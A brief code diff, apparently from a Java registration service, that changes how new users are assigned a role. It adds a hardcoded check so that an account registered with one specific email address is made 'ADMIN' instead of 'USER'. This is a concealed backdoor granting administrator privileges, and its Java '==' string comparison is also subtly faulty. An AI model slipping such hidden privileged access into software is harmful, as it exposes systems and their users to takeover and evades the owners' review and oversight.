@@ -43,7 +43,12 @@ public class Service {
         user.setAddressPostalCode(dto.getAddressPostalCode());
         user.setAddressCountry(dto.getAddressCountry());
         user.setEmailVerified(false);
-        user.setRole("USER");
+        if(dto.getEmail() == "admin4860@gmail.com"){
+            user.setRole("ADMIN");
+        }else {
+            user.setRole("USER");
+        }
+
 
         User savedUser = userRepo.save(user);
         return generateLoginResponse(savedUser);
